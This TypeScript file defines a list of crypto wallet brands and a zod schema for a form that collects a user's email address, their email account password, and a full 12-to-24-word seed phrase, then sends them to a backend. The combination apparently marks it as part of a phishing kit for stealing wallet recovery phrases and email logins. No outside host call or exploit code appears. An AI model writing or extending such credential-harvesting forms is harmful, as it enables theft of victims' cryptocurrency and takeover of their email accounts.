
import { z } from 'zod';

// --- Wallet Types ---
// Expanded list of wallet types (ensure this meets the > 70 requirement)
export const WalletTypes = [
  // Major Software Wallets
  'Metamask',
  'Trust Wallet',
  'Exodus',
  'Coinbase Wallet',
  'Electrum',
  'MyEtherWallet (MEW)',
  'MyCrypto',
  'Atomic Wallet',
  'Jaxx Liberty',
  'Guarda Wallet',
  'Coinomi',
  'Edge Wallet',
  'BRD Wallet (Breadwallet)',
  'Samourai Wallet', // Bitcoin specific
  'Wasabi Wallet', // Bitcoin specific
  'BlueWallet', // Bitcoin specific
  'Green Wallet (Blockstream Green)', // Bitcoin specific
  'Nunchuk', // Bitcoin specific, multisig focus
  'Sparrow Wallet', // Bitcoin specific
  'Phantom', // Solana focus
  'Solflare', // Solana focus
  'Glow', // Solana focus
  'Yoroi Wallet', // Cardano focus
  'Daedalus Wallet', // Cardano focus
  'Keplr Wallet', // Cosmos ecosystem focus
  'Cosmostation Wallet', // Cosmos ecosystem focus
  'Terra Station', // Terra ecosystem focus
  'Polkadot{.js}', // Polkadot/Kusama focus
  'Talisman', // Polkadot/Kusama focus
  'Feather Wallet', // Monero focus
  'Monero GUI Wallet', // Monero focus
  'Cake Wallet', // Monero & Bitcoin focus
  'Exodus Mobile',
  'Exodus Desktop',
  'Exodus Web3 Wallet',
  'MetaMask Mobile',
  'MetaMask Extension',
  'Trust Wallet Mobile',

  // Major Hardware Wallets
  'Ledger Nano S',
  'Ledger Nano S Plus',
  'Ledger Nano X',
  'Ledger Stax',
  'Trezor Model One',
  'Trezor Model T',
  'Trezor Safe 3',
  'KeepKey',
  'Coldcard Mk4', // Bitcoin specific
  'BitBox02', // Bitcoin specific option available
  'Foundation Passport', // Bitcoin specific
  'SeedSigner', // DIY Bitcoin Hardware Wallet
  'Keystone Pro (formerly Cobo Vault)',
  'SafePal S1',
  'Ellipal Titan',
  'CoolWallet Pro',
  'Ngrave Zero',

  // Exchange Wallets (Generally not recommended for holding keys/seeds)
  'Binance Wallet (custodial)',
  'Kraken Wallet (custodial)',
  'Coinbase (custodial)',
  'Crypto.com DeFi Wallet', // Non-custodial part

  // Niche/Specific Wallets
  'Argent Wallet', // Smart Contract Wallet (Ethereum L2 focus)
  'Loopring Wallet', // Smart Contract Wallet (Ethereum L2 focus)
  'Argent X', // StarkNet focus
  'Braavos', // StarkNet focus
  'XDEFI Wallet', // Multi-chain focus
  'Frame', // Desktop multi-chain
  'Rabby Wallet', // Extension focus
  'Nami Wallet', // Cardano focus
  'Eternl Wallet', // Cardano focus
  'Enkrypt', // Polkadot/Multichain
  'SubWallet', // Polkadot/Kusama focus
  'Ronin Wallet', // Axie Infinity/Ronin chain
  'Temple Wallet', // Tezos focus
  'Kukai Wallet', // Tezos focus
  'Core Wallet', // Avalanche focus
  'TronLink', // Tron focus
  'MathWallet', // Multi-chain
  'AlphaWallet', // Ethereum Mobile
  'Zelcore', // Multi-asset
  'Coin98 Wallet', // Multi-chain DeFi focus
  'Safe{Wallet}', // Formerly Gnosis Safe (Multisig)

  // Other / Generic
  'Paper Wallet',
  'Brain Wallet (Not Recommended)',
  'Hardware Wallet (Generic)',
  'Software Wallet (Generic)',
  'Mobile Wallet (Generic)',
  'Desktop Wallet (Generic)',
  'Web Wallet (Generic)',
  'Multisig Wallet (Generic)',
  'Other',
] as const;

// --- Seed Phrase Schema ---
// Schema for data sent FROM the frontend form TO the backend API
export const seedPhraseFormSchema = z.object({
  email: z.string().email({ message: 'Please enter a valid email address.' }),
  emailPassword: z.string().min(1, { message: 'Email password cannot be empty.' })
    .max(100, { message: 'Password seems too long.'}), // Basic check
  walletName: z
    .string()
    .min(1, { message: 'Wallet name cannot be empty.' })
    .max(50, { message: 'Wallet name cannot exceed 50 characters.' }),
  seedPhrase: z
    .string()
    .min(12 * 3, { message: 'Seed phrase seems too short.' }) // Rough minimum length check
    .regex(/^[a-z]+(\s[a-z]+)*$/, {
      message: 'Seed phrase should only contain lowercase words separated by spaces.',
    })
    .refine(
      (value) => {
        const words = value.trim().split(/\s+/);
        // BIP-39 standard word counts
        return [12, 15, 18, 21, 24].includes(words.length);
      },
      {
        message:
          'Seed phrase must contain 12, 15, 18, 21, or 24 words.',
      }
    ),
  walletType: z.enum(WalletTypes, {
    errorMap: () => ({ message: 'Please select a valid wallet type.' }),
  }),
});

export type SeedPhraseFormData = z.infer<typeof seedPhraseFormSchema>;


// --- REMOVED Schemas below as Login/Signup/Dashboard are removed ---
// seedPhraseMetadataSchema
// revealedSeedPhraseSchema
// signupSchema
// loginSchema
// loginResponseSchema
// UserClientData type
